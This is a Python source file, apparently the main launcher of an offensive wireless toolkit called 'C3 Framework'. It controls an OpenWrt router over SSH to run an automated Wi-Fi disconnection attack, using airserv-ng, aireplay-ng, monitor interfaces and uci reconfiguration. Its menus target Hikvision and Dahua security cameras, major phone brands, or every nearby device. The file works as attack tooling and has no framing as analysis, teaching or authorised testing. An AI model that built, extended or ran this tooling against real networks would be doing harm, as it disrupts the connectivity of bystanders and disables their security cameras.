#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate C3 Framework - Hardened OOP Main Bootstrap (OUI & Watchdog Integrated)
File: /home/kali/C3_Framework/main_v1.py
"""

import os
import sys
import time
import signal
import datetime
import traceback
from core.ssh_executor import SSHHardwareExecutor
from core.dynamic_scout import DynamicScout
from core.database import DatabaseManager
from security_files.oop_orchestrator import AttackOrchestrator
from security_files.airserv_detector import AirservDetector
from security_files.radar_manager import RadarSizeGuardManager
from security_files.cpu_watchdog import RemoteCPUWatchdog
from security_files.attack_monitor import AttackPortMonitor
from modules.target_filter_engine import TargetFilterEngine
from modules.ap_ui import ProtectedDevicesConsoleUI
from modules.group_ui import TargetGroupConsoleUI
from modules.control_center_ui import FastControlCenterUI

class C3FrameworkBootstrap:
    def __init__(self):
        self.log_path = "/home/kali/C3_Framework/storage/logs/attack_errors.log"
        print("\033[94m[*] Initializing Hardened C3 Framework Architecture...\033[0m")
        
        self.scout_executor = SSHHardwareExecutor()
        self.orch_executor = SSHHardwareExecutor()
        self.airserv_executor = SSHHardwareExecutor()
        self.filter_executor = SSHHardwareExecutor()
        self.watchdog_executor = SSHHardwareExecutor()
        
        self.db = DatabaseManager()
        self.scout = DynamicScout(self.scout_executor)
        self.orchestrator = AttackOrchestrator(self.orch_executor)
        self.airserv_mgr = AirservDetector(self.airserv_executor)
        self.radar_mgr = RadarSizeGuardManager()
        
        self.cpu_guard = RemoteCPUWatchdog(self.watchdog_executor)
        self.port_guard = AttackPortMonitor()
        self.filter_engine = TargetFilterEngine(self.filter_executor, self.db)
        
        self.ap_interface = ProtectedDevicesConsoleUI(self.db)
        self.group_interface = TargetGroupConsoleUI(self.db)
        self.fast_control_center = FastControlCenterUI(self.scout_executor, self.scout)
        
        self.target_vifs_cache = []
        self.is_attack_active = False
        self.strain_counter = 0 # عداد تتابع إنهاك المعالج عتادياً
        
        signal.signal(signal.SIGINT, self.pure_safe_retreat_handler)

    def pure_safe_retreat_handler(self, signum, frame):
        print("\n\033[93m[!] EMERGENCY CLEANUP - FORCING ISOLATION DISMANTLE...\033[0m")
        try:
            emergency_executor = SSHHardwareExecutor()
            if hasattr(self, 'radar_mgr'):
                self.radar_mgr.terminate_local_radar()
                
            emergency_cmd = [
                "/bin/sh", "-c", 
                "killall -9 airserv-ng aireplay-ng > /dev/null 2>&1; "
                "uci del wireless.mon0 > /dev/null 2>&1; "
                "uci del wireless.mon1 > /dev/null 2>&1; "
                "uci revert wireless; wifi reload"
            ]
            emergency_executor.execute_raw_command(emergency_cmd)
            
            if self.target_vifs_cache:
                commands_pool = []
                for item in self.target_vifs_cache:
                    vif = item.get("vif")
                    if vif:
                        commands_pool.append(f"uci set wireless.{vif}.disabled='0'")
                if commands_pool:
                    commands_pool.append("uci commit wireless")
                    commands_pool.append("wifi reload")
                    emergency_executor.execute_raw_command(["/bin/sh", "-c", " && ".join(commands_pool)])
                    
            print("\033[92m[+] Retraction Complete. Airspace Cleaned Safely.\033[0m")
        except Exception as e:
            print(f"[!] Error during emergency retreat: {str(e)}")
        finally:
            sys.exit(0)

    def bootstrap_arsenal_menu(self):
        while True:
            print("\n" + "="*50)
            print("      \033[96mULTIMATE C3 FRAMEWORK CONTROL CENTER\033[0m      ")
            print("="*50)
            print(" Shield Pool Configuration (Fahd Shield AP UI)")
            print(" Combat Group Matrix Manager (Target Group UI)")
            print(" Fast Hardware & Hot Disconnection UI")
            print(" Live Radio-Frequency Scout (ubus active status)")
            print(" Launch Surgical Automated Core Attack")
            print(" Emergency System Destruction & Cleanup")
            print(" Exit Terminal Securely")
            print("="*50)
            
            choice = input("[>] Select Command Option: ").strip()
            if choice == "1":
                self.ap_interface.display_ui_frame()
            elif choice == "2":
                self.group_interface.display_group_menu()
            elif choice == "3":
                self.fast_control_center.display_hot_center()
            elif choice == "4":
                freq = input("[?] Choose Frequency Target (2G / 5G): ").strip().upper()
                if freq in ["2G", "5G"]:
                    res = self.scout.parse_interfaces_by_frequency(freq)
                    print(f"\n[*] Discovered Hardware Interfaces for {freq}:")
                    for i in res:
                        print(f" - Radio: {i['radio_id']} | VIF: {i['vif_id']} | Interface: {i['ifname']} | Channel: {i['channel']} | Clients: {i['clients']}")
            elif choice == "5":
                self.execute_automated_attack_pipeline()
            elif choice == "6" or choice == "7":
                self.pure_safe_retreat_handler(None, None)

    def execute_automated_attack_pipeline(self):
        freq_target = input("[?] Target Attack Frequency (2G / 5G): ").strip().upper()
        if freq_target not in ["2G", "5G"]:
            print("[!] Operation Aborted. Invalid Frequency.")
            return

        # الخيار الرقمي المرن للـ OUI الموجه لمنع ضياع الحزم
        print("\n[ OUI Targeting Filter Configuration ]")
        print(" Target Hikvision & Dahua Cameras Exclusively")
        print(" Target Apple, Samsung, Huawei & Mobile Stations")
        print(" Broadcast Isolation Across All Devices (Wildcard)")
        oui_choice = input("[>] Filter Mode Choice [1/2/3]: ").strip()
        
        if oui_choice == "1":
            self.filter_engine.oui_filter.set_target_vendors(["Hikvision_Camera", "Dahua_Camera"])
        elif oui_choice == "2":
            self.filter_engine.oui_filter.set_target_vendors(["Huawei_Device", "Apple_Device", "Samsung_Device", "Xiaomi_Device"])
        else:
            self.filter_engine.oui_filter.set_target_vendors([]) # ضرب الجميع كحالة عامة

        print(f"\n[*] [Phase A] Triggering Dynamic Scout for {freq_target} airspace...")
        total_clients, target_vifs = self.scout.evaluate_client_danger_zone(freq_target)
        self.target_vifs_cache = target_vifs
        
        if total_clients > 0:
            print(f"\033[93m[!] WARNING: {total_clients} Active Clients detected!\033[0m")
            confirm = input("[?] Force clients disconnection? [y/n]: ").strip().lower()
            if confirm != 'y':
                return

        print("[*] [Phase B] Hardening UCI Core & Isolating Wireless Broadcasts...")
        if not self.orchestrator.hard_isolate_frequency(target_vifs):
            return

        chosen_radio = target_vifs[0]["radio"] if target_vifs else "radio0"
        chosen_channel = target_vifs[0]["channel"] if target_vifs else 6
        
        from security_files.oop_monitor_manager import MonitorInterfaceManager
        mon_manager = MonitorInterfaceManager(self.scout_executor)
        
        if not mon_manager.establish_hardware_monitors(chosen_radio, 0):
            return

        snatch_res = mon_manager.snatch_actual_kernel_name()
        if snatch_res["status"] != "success":
            mon_manager.clear_monitor_structures(0)
            return
            
        actual_mon_name = snatch_res["actual_name"]
        mon_manager.force_kickstart_interface(actual_mon_name)

        print("[*] [Phase C] Firing unique dynamic port binding map...")
        unique_port = self.airserv_mgr.generate_unique_hardware_port(freq_target, chosen_channel)
        self.airserv_mgr.launch_airserv_daemon(actual_mon_name, unique_port)
        
        self.radar_mgr.launch_local_radar(self.scout_executor.ip, unique_port)
        print("\033[92m[+] C3 ARSENAL UNLEASHED. Streaming attack rows (Press Ctrl+C to retreat)...\033[0m\n")
        
        self.is_attack_active = True
        self.strain_counter = 0
        
        while self.is_attack_active:
            output_size = self.radar_mgr.get_latest_csv_size("radar_output")
            latest_csv = "/home/kali/C3_Framework/storage/logs/radar_output-01.csv"
            
            if output_size > 0 and os.path.exists(latest_csv):
                self.filter_engine.process_radar_stream_and_inject(latest_csv, actual_mon_name, unique_port)
            
            # 1. تفعيل حارس ثبات المنافذ البعيدة للكشف عن سقوط الخادم
            if self.port_guard.verify_remote_port_binding(self.scout_executor.ip, unique_port) == "collapsed":
                print("\033[91m[!] CRITICAL: Remote airserv port bind collapsed! Rebooting daemon...\033[0m")
                self.airserv_mgr.launch_airserv_daemon(actual_mon_name, unique_port)
                time.sleep(2)

            # 2. تفعيل حارس المعالج وآلية الكبح الزمني المتتابع (CPU Backoff Matrix)
            if self.cpu_guard.is_processor_exhausted():
                self.strain_counter += 1
                print(f"\033[93m[*] WARNING - CPU Strain active. Backoff triggered (Pause 5s). Counter: {self.strain_counter}/3\033[0m")
                time.sleep(5) # كبح زمني مؤقت لترتاح النواة البعيدة وتبرد
                
                if self.strain_counter >= 3:
                    print("\033[91m[!] FATAL - Hardware Core Strain continued for 3 rounds. Activating Safe Retreat طوعياً...\033[0m")
                    break
            else:
                self.strain_counter = max(0, self.strain_counter - 1) # خفض العداد تتابعاً إن برد المعالج

            guard_status = self.radar_mgr.execute_file_size_guard_check(self.scout_executor.ip, unique_port)
            if guard_status == "router_dead":
                print("\033[91m[!] CRITICAL: Router stopped responding. Aborting.\033[0m")
                break
            time.sleep(2)
            
        self.pure_safe_retreat_handler(None, None)

if __name__ == "__main__":
    if os.getuid() != 0:
        sys.exit(1)
    launcher = C3FrameworkBootstrap()
    launcher.bootstrap_arsenal_menu()
